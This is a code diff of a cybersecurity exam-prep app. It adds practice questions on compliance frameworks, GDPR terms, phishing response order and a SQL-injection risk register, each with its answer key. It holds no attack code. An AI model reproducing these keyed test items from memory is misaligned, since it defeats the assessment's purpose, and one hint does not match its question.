+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. US Federal agency implementing FISMA compliance → NIST RMF (SP 800-37) and NIST SP 800-53 - Correct — NIST RMF is the mandatory framework for US federal agencies under FISMA. SP 800-53 provides the control catalogue.\n2. E-commerce company wanting to demonstrate security to enterprise customers → SOC 2 Type II audit - Correct — SOC 2 Type II is the industry standard for SaaS/cloud providers demonstrating security controls effectiveness over time (typically 6-12 months of operation).\n3. Industrial water treatment facility → ISO 27001 certification as their primary OT security framework - The CISO recommends ISO 27001 because it is internationally recognised and covers all aspects of information security.\n4. Organisation wanting voluntary cybersecurity risk management → NIST Cybersecurity Framework (CSF) - Correct — NIST CSF is explicitly designed as a voluntary, risk-based framework usable by any organisation regardless of size or sector.",
+      "choices": [
+        "US Federal agency implementing FISMA compliance → NIST RMF (SP 800-37) and NIST SP 800-53",
+        "E-commerce company wanting to demonstrate security to enterprise customers → SOC 2 Type II audit",
+        "Industrial water treatment facility → ISO 27001 certification as their primary OT security framework",
+        "Organisation wanting voluntary cybersecurity risk management → NIST Cybersecurity Framework (CSF)"
+      ],
+      "correct": 2
+    },
+    {
+      "id": "p098",
+      "ch": "5",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "medium",
+      "cat": "Data Privacy",
+      "title": "Complete the data privacy rights and obligations",
+      "scenario": "",
+      "question": "Fill in the correct GDPR term for each description.",
+      "explanation": "DPIA: mandatory before processing if \"high risk\" — organisations must complete this before deploying facial recognition, large-scale health monitoring, or systematic profiling. Consult the DPA if residual risk is unacceptable. Right to Erasure (\"Right to be Forgotten\"): Article 17 — not absolute; exceptions exist for legal obligations, public interest, archiving, and freedom of expression. DPA (Data Processing Agreement): legally required between controller and processor. Cloud providers (AWS, Microsoft, Google) must sign DPAs with customers. Without a DPA, using a cloud provider for EU personal data is a GDPR violation.",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "The ___ is a legal requirement under GDPR Article 35 for processing operations that are \"likely to result in a high risk\" — including large-scale processing of special category data or systematic monitoring.",
+          "answer": "Data Protection Impact Assessment (DPIA)",
+          "hint": "Privacy by Design review, Data Protection Impact Assessment (DPIA), Data Processing Agreement, Legitimate Interest Assessment"
+        },
+        {
+          "id": "b1",
+          "sentence": "Under GDPR Article 17, the ___ allows individuals to request deletion of their personal data when it is no longer necessary for the original purpose or consent is withdrawn.",
+          "answer": "Right to Erasure",
+          "hint": "Right to Portability, Right to Erasure, Right of Access, Right to Rectification"
+        },
+        {
+          "id": "b2",
+          "sentence": "A ___ is a contract required by GDPR Article 28 between a controller and processor, specifying the subject matter, duration, nature, and purpose of processing, and the processor's obligations.",
+          "answer": "Data Processing Agreement",
+          "hint": "Service Level Agreement, Non-Disclosure Agreement, Data Processing Agreement, Joint Controller Agreement"
+        }
+      ]
+    },
+    {
+      "id": "p099",
+      "ch": "5",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "easy",
+      "cat": "Security Awareness",
+      "title": "Order the steps to respond to a reported phishing email",
+      "scenario": "",
+      "question": "An employee forwards a suspicious email to security@company.com. Order the security team's response steps CORRECTLY.",
+      "explanation": "Phishing response order: (1) Analyse safely — understand what the email does before taking action (is it malware, credential theft, or a false positive?). (2) Quarantine — remove from all inboxes to prevent further clicks. (3) Block the domain — prevent anyone from reaching it if they click cached emails. (4) Check for victims — proxy and SIEM logs reveal who clicked and whether credentials were entered. (5) Company-wide alert — inform employees after you have complete information (not before — premature alerts can cause panic or tip off an insider). Reset credentials for any confirmed victims before step 5.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Quarantine the email from all recipient mailboxes using the email security platform"
+        },
+        {
+          "id": "o1",
+          "label": "Analyse the email headers, links, and attachments in a safe sandbox environment"
+        },
+        {
+          "id": "o2",
+          "label": "Send a company-wide alert warning other employees about the phishing campaign"
+        },
+        {
+          "id": "o3",
+          "label": "Check if any recipients clicked links or entered credentials using proxy and SIEM logs"
+        },
+        {
+          "id": "o4",
+          "label": "Block the malicious domain at the email gateway and web proxy"
+        }
+      ],
+      "correctOrder": [
+        "o1",
+        "o0",
+        "o4",
+        "o3",
+        "o2"
+      ]
+    },
+    {
+      "id": "p100",
+      "ch": "5",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "hard",
+      "cat": "Risk Management",
+      "title": "Evaluate a risk register and select the correct risk response",
+      "scenario": "",
+      "question": "Which risk treatment decision is the MOST appropriate based on the risk register information?",
+      "explanation": "Option A (remediate) is the most appropriate because: (1) The cost-benefit is overwhelming — £12,000 fix vs £500K+ regulatory fines + breach costs + reputational damage. (2) The residual risk after current controls is still HIGH — the WAF provides incomplete protection (WAF rules can be bypassed). (3) PCI DSS Requirement 6.3.2 mandates secure coding practices — accepting this risk may itself be a compliance violation. Option B: accepting a HIGH residual risk on a revenue-generating payment system with a cheap fix available is difficult to justify to a board. Option C: insurance doesn't fix the vulnerability. Option D: transferring to a processor is a valid long-term option but not faster than a 2-week code fix.",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
+      "logData": "RISK REGISTER — Information Security\n======================================\nRISK ID: ISR-047\nAsset: Customer-facing payment portal (revenue: £8.4M/year)\nThreat: SQL injection exploitation via search function\nVulnerability: Unsanitised input in product search endpoint\nLikelihood: HIGH (public PoC exploit exists for this endpoint type)\nImpact: CRITICAL (full database access, PAN exposure, PCI DSS fines up to £500K)\nCurrent Controls: WAF (basic rules), HTTPS, authentication required\nInherent Risk Rating: CRITICAL\nResidual Risk (with current controls): HIGH\n\nProposed treatments:\nA) Remediate via code fix (parameterised queries): Cost £12,000, timeline 2 weeks\nB) Accept residual risk — WAF provides sufficient protection\nC) Purchase additional cyber insurance to cover potential breach costs\nD) Transfer to third-party payment processor (eliminate cardholder data from environment)",
+      "choices": [
+        "Option A: Remediate via code fix — £12,000 is substantially less than the £500K+ regulatory fine exposure, and the residual risk is HIGH despite current controls",
+        "Option B: Accept residual risk — the WAF is already a compensating control and acceptance is a valid risk management strategy",
+        "Option C: Purchase additional cyber insurance — transfers the financial risk",
+        "Option D: Transfer to third-party processor — eliminates the risk entirely by removing cardholder data from the environment"
+      ],
+      "correct": 0
+    }
 ];
 
 // ═══════════════════════════════════════════════════════════════
@@ -2407,7 +5643,7 @@ function DailyChallenge({t,onLogin,user=null}) {
       <p style={{color:t.textSec,marginBottom:24}}>Come back tomorrow for a new challenge!</p>
       {!user&&<div className="card" style={{padding:"16px 20px",marginBottom:20,textAlign:"left"}}>
         <div className="label" style={{marginBottom:10}}>Unlock more with a free account</div>
-        {["100 MCQs across all 5 exam domains","50 PBQ simulations with 8 question types","Progress tracking and weak area analysis","Chapter-by-chapter study organisation"].map((f,i)=>(
+        {[`${MCQ_BANK.length} MCQs across all 5 exam domains`,`${PBQ_BANK.length} PBQ simulations with 8 question types`,"Progress tracking and weak area analysis","Chapter-by-chapter study organisation"].map((f,i)=>(
           <div key={i} style={{display:"flex",gap:8,alignItems:"center",fontSize:13,color:t.textSec,padding:"4px 0"}}>
             <span style={{color:t.green}}>✓</span>{f}
           </div>
@@ -3633,7 +6869,7 @@ function Pricing({user,onUpgrade,onSyncBilling,onCancelMembership,onDeleteAccoun
           <div style={{fontSize:15,color:t.text,fontWeight:900,marginBottom:4,textTransform:"uppercase"}}>per year / annual billing</div>
           <div style={{fontSize:13,color:t.green,fontWeight:800,marginBottom:18}}>Works out to roughly $0.40/month</div>
           <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:24}}>
-            {["Everything in Free","All 50 PBQ simulations","8 simulation types","Full progress analytics","Chapter-by-chapter tracking","Detailed per-question feedback"].map(f=>(
+            {["Everything in Free",`${PBQ_BANK.length} PBQ simulations`,"8 simulation types","Full progress analytics","Chapter-by-chapter tracking","Detailed per-question feedback"].map(f=>(
               <div key={f} style={{display:"flex",gap:8,fontSize:13,color:t.textSec}}>
                 <span style={{color:t.green}}>✓</span>{f}
               </div>
